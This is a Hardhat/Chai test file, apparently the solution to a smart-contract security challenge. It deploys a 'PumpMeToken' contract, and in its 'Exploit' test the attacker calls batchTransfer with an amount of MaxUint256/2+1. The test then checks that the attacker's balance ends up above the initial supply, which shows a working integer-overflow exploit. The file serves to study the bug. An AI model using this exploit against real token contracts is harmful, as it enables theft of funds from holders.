const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Test', function () {

    let token;
    let deployer, attacker;
    const INITIAL_SUPPLY = ethers.parseEther("1000000");

    before(async function () {

        [deployer, attacker] = await ethers.getSigners();

        const pumpMeTokenFactory = await ethers.getContractFactory(
            'PumpMeToken',
            deployer
        );

        token = await pumpMeTokenFactory.deploy(INITIAL_SUPPLY);
        
        let attackerBalance = await token.balanceOf(attacker.address);
        let deployerBalance = await token.balanceOf(deployer.address);
        expect(attackerBalance).to.equal(0);
        expect(deployerBalance).to.equal(INITIAL_SUPPLY);
    });

    it('Exploit', async function () {
        const receivers = [attacker.address, deployer.address];
        const amount = ethers.MaxUint256 / BigInt(2) + BigInt(1);
        await token.connect(attacker).batchTransfer(receivers, amount);
    });

    after(async function () {
        
        let attackerBalanceAfter = await token.balanceOf(attacker.address);
        expect(attackerBalanceAfter).to.be.gt(INITIAL_SUPPLY);
    });
});
